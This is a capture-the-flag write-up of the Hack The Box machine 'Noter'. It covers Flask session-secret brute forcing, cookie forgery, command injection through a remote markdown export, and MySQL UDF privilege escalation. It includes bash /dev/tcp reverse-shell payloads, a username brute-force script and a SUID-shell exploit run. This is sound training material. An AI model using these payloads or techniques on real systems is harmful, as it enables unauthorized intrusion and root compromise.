# Noter

## Nmap 

```bash
└─$ nmap -sC -sV -Pn -oA nmap 10.10.11.160
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-24 14:10 +01
Nmap scan report for 10.10.11.160
Host is up (0.064s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)
|   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)
|_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title: Noter
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.55 seconds
                                                                  
```
## Web enumeration

Checking port 5000 first. It's a web page. It's probabaly django or flask app based on 'Werkzug'. Okay! It's flask.

![hackthebox noter](https://th3redtea.github.io/assets/img/Screenshot_2022-08-24_14-50-07.png)


I tried SSTI (Server-side template injection) because there was input fields and SQL injection because I tought I could fetch other notes. Checking Hacktricks I found: [flask-unsign](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask#flask-unsign)

Clone this repository and install it using the setup.py `https://github.com/Paradoxis/Flask-Unsign` 

I registed, login, and grab the session cookie, then decode it. 

```bash
└─$ flask-unsign --decode -c "eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiVGhlUmVkVGVhIn0.YweJwg.C0OJGviF9xc3MJ5m49_WCs4eS3Y"
{'logged_in': True, 'username': 'TheRedTea'}
```
Tought of changing my username to admin but I need to brute force the secret key first. flask-unsign will do it for me. 

```
└─$ flask-unsign --wordlist ~/Downloads/rockyou.txt --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiVGhlUmVkVGVhIn0.YweJwg.C0OJGviF9xc3MJ5m49_WCs4eS3Y' --no-literal-eval 
[*] Session decodes to: {'logged_in': True, 'username': 'TheRedTea'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 17024 attempts
b'secret123'
```
Okay the secret now is "secret123"

Then I tried with admin. 
```bash
└─$ flask-unsign --sign --cookie "{'logged_in': True, 'username': 'admin'}" --secret 'secret123'
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.YweNmw.AOrN2nApZyyeBaZ4oHmvQxDJX7g
```
Nope, that didn't work.

I decided to craft a script to brute force usernames: 

```python 
import requests
import sys
import subprocess


if len(sys.argv) < 2:
    print("Need wordlist")
    sys.exit()


def looper():
   wordlist = sys.argv[1]
 
   url = 'http://10.10.11.160:5000/notes'
   f = open(wordlist, "r")
   for line in f.readlines():
        line = line.strip('\n')
        cookie = subprocess.run("flask-unsign --sign --cookie '{'logged_in': True, 'username': '"+line+"'}' --secret 'secret123'", shell=True, stdout=True)
        print(line)
        headers = {'SetCookie': f'session={cookie}'}
        r = requests.get(url, headers=headers)
        content = r.text
        try:
            if "Unauthorized, Please login" in content: 
                print("Nope")
                pass
            elif "Noter Premium Membership" in content: 
                print("That was it")
        except:
            print("error")


if __name__ == "__main__":
    looper()
```

Got the cookie: `eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YwepEw.STvhebuip88zrjlFJq-JXORQkiA`

After loggin in, I found two notes. One of them says: 

![hackthebox noter](https://th3redtea.github.io/assets/img/Screenshot_2022-08-30_13-28-04.png)

I got: 

password: `blue@Noter!`
new user: `ftp_admin`

## Access to FTP
 
Let's access FTP. 

```bash

└─$ ftp 10.10.11.160 21                                                                                                                                                           
Connected to 10.10.11.160.
220 (vsFTPd 3.0.3)
Name (10.10.11.160:user): blue
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||48719|)
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 May 02 23:05 files
-rw-r--r--    1 1002     1002        12569 Dec 24  2021 policy.pdf
226 Directory send OK.
ftp> cd files
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||30461|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> cd ../
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||25409|)
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 May 02 23:05 files
-rw-r--r--    1 1002     1002        12569 Dec 24  2021 policy.pdf
226 Directory send OK.
ftp> get policy.pdf
local: policy.pdf remote: policy.pdf
229 Entering Extended Passive Mode (|||33923|)
150 Opening BINARY mode data connection for policy.pdf (12569 bytes).
100% |************************************************************************************************************************************************| 12569        2.40 MiB/s    00:00 ETA
226 Transfer complete.
12569 bytes received in 00:00 (91.40 KiB/s)
ftp> 

```

Checking the policy.pdf 

![hackthebox Noter](https://th3redtea.github.io/assets/img/Screenshot_2022-08-30_13-12-22.png)

Maybe the admin doesn't like password policies. Let's try to access ftp using the `ftp_admin` username.

```bash
└─$ ftp 10.10.11.160 21 
Connected to 10.10.11.160.
220 (vsFTPd 3.0.3)
Name (10.10.11.160:user): ftp_admin
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

hhhhhhhhh The irony. 

I got two backups: 

```bash
ftp> ls
229 Entering Extended Passive Mode (|||40482|)
150 Here comes the directory listing.
-rw-r--r--    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip
-rw-r--r--    1 1003     1003        26298 Dec 01  2021 app_backup_1638395546.zip
226 Directory send OK.
ftp> 
```

Found this password: 

```python
# Config MySQL
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'root'
app.config['MYSQL_PASSWORD'] = 'Nildogg36'
app.config['MYSQL_DB'] = 'app'
app.config['MYSQL_CURSORCLASS'] = 'DictCursor'
```
The second backup has this function which the older one doesn't have.

```python
# Export notes
@app.route('/export_note', methods=['GET', 'POST'])
@is_logged_in
def export_note():
    if check_VIP(session['username']):
        try:
            cur = mysql.connection.cursor()

            # Get note
            result = cur.execute("SELECT * FROM notes WHERE author = %s", ([session['username']]))

            notes = cur.fetchall()

            if result > 0:
                return render_template('export_note.html', notes=notes)
            else:
                msg = 'No notes Found'
                return render_template('export_note.html', msg=msg)
            # Close connection
            cur.close()
                
        except Exception as e:
            return render_template('export_note.html', error="An error occured!")

    else:
        abort(403)
```
Tried password on ssh with both users. No success. 

visting: `http://10.10.11.160:5000/export_note`

I see two options to export notes: 

1 export availble notes. 
2 export remote notes. 

A remote function would be interetsing. Let's do some code review.

```python

# Export remote
@app.route('/export_note_remote', methods=['POST'])
@is_logged_in
def export_note_remote():
    if check_VIP(session['username']):
        try:
            url = request.form['url']

            status, error = parse_url(url)

            if (status is True) and (error is None):
                try:
                    r = pyrequest.get(url,allow_redirects=True)
                    rand_int = random.randint(1,10000)
                    command = f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}"
                    subprocess.run(command, shell=True, executable="/bin/bash")

                    if os.path.isfile(attachment_dir + f'{str(rand_int)}.pdf'):

                        return send_file(attachment_dir + f'{str(rand_int)}.pdf', as_attachment=True)

                    else:
                        return render_template('export_note.html', error="Error occured while exporting the !")

                except Exception as e:
                    return render_template('export_note.html', error="Error occured!")


            else:
                return render_template('export_note.html', error=f"Error occured while exporting ! ({error})")
            
        except Exception as e:
            return render_template('export_note.html', error=f"Error occured while exporting ! ({e})")

    else:
        abort(403)
```

Breaking the code down: 

The code check if you have the VIP subscription by callling the function `check_VIP()`, if so, it takes the url from the form and check its validity. Then, it takes the url and do a get request to the markdown file the user provides. after that, it takes the response, the content of the md file, and store it in the the `command` varialble, then it runs the command with `/bin/bash` using `subprocess`. The command convert the md to pdf through the `md-to-pdf` library. So biscally we will take a reverse shell, store it inside an md file and hosted on a local server, then call it. Let's try that now.

1 the reverse shell: 

```bash
└─$ cat theredtea.md

--';bash -i >& /dev/tcp/10.10.14.106/1337 0>&1;'--

```
2 export it: 

![hackthebox noter](https://th3redtea.github.io/assets/img/Screenshot_2022-08-31_10-58-07.png)

3 recieve the revershell with pwncat 

```bash
└─$ pwncat-cs -lp 1337
/opt/pwncat/lib/python3.10/site-packages/paramiko/transport.py:178: CryptographyDeprecationWarning: Blowfish has been deprecated
  'class': algorithms.Blowfish,
[10:51:33] Welcome to pwncat 🐈!                                              __main__.py:164
[10:58:13] received connection from 10.10.11.160:36552                             bind.py:84
[10:58:17] 10.10.11.160:36552: registered new host w/ db                       manager.py:957
(local) pwncat$ ls
[10:58:28] error: ls: unknown command                                          manager.py:957
(local) pwncat$                                                                              
(remote) svc@noter:/home/svc/app/web$ ls
app.py  misc  templates
(remote) svc@noter:/home/svc/app/web$ cd /home/svc/
(remote) svc@noter:/home/svc$ ls
app  user.txt
(remote) svc@noter:/home/svc$ cat user.txt 
93e08************************85
(remote) svc@noter:/home/svc$ 
```

# Root

The root is running MySQL. And that's bad! 

![hackthebox root](https://th3redtea.github.io/assets/img/mysqllinpease.png)

MySQL can execute system commands. We will be using user-defined function with this 2006's exploit: 

https://www.exploit-db.com/exploits/1518

Here's an article to follow: https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf

Keep in mind that we have access to the database with creds


```bash
svc@noter:/tmp$ mysql -u root -p'Nildogg36'
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 2770
Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```
I tried to exploit it manually but it didn't work out for me, so I tried this exploit:

https://github.com/d7x/udf_root

```bash

(remote) svc@noter:/tmp$ python2.7 udf_root.py --username root --password Nildogg36
Plugin dir is /usr/lib/x86_64-linux-gnu/mariadb19/plugin/
Trying to create a udf library...
UDF library crated successfully: /usr/lib/x86_64-linux-gnu/mariadb19/plugin/udf5235.so
Trying to create sys_exec...
Checking if sys_exec was crated...
sys_exec was found: *************************** 1. row ***************************
name: sys_exec
 ret: 2
  dl: udf5235.so
type: function

Generating a suid binary in /tmp/sh...
+-------------------------------------------------------------------------+
| sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh') |
+-------------------------------------------------------------------------+
|                                                                       0 |
+-------------------------------------------------------------------------+
Trying to spawn a root shell...
$ ls
puppeteer_dev_chrome_profile-0wSzCq
puppeteer_dev_chrome_profile-7Qtr0l
puppeteer_dev_chrome_profile-EMfYKI
puppeteer_dev_chrome_profile-Jrd9Uv
sh
systemd-private-055ec5aa58fc4854a8247e659ec73edf-systemd-logind.service-yBhtQh
systemd-private-055ec5aa58fc4854a8247e659ec73edf-systemd-resolved.service-9tEE4h
systemd-private-055ec5aa58fc4854a8247e659ec73edf-systemd-timesyncd.service-e0o1ui
udf_root.py
vmware-root_751-4290559920
$ /tmp/sh -p
$ whoami
root
$ 

```
If you want to try what I failed to do, here's what I tried: 

```bash
mysql -u root -p'Nildogg36'

use mysql;

create table foo(line blob);

insert into foo values(load_file('/tmp/raptor_udf2.so'));

select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';

create function sys_exec returns integer soname 'raptor_udf2.so';

select * from mysql.func;

select do_system('bash -i >& /dev/tcp/10.10.14.106/1338');

show variables like '%plugin%';

```

That was it! See you in the next writeup.

